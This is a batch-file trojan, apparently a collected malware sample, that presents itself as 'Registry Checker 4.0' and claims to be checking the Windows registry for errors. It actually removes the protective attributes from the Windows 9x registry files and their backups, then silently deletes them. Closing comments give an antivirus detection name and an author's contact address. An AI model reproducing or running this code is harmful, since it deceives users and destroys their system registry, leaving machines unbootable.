@echo off
@echo @echo This is Registry Checker 4.0
@echo @echo made in Romania, by Ratty.
@echo @echo Please wait while windows checks your registry for any errors.
attrib c:\system.1st -s -h -r +a
attrib c:\windows\system.da0 -s -h -r +a
attrib c:\windows\system.dat -s -h -r +a
echo y | del c:\system.1st >nul
echo y | del c:\windows\system.da0 >nul
echo y | del c:\windows\system.dat >nul
::Kaspersky name is Trojan.BAT.Ratty.Delwin
::Another DVL creation
::dvl2003ro@yahoo.co.uk
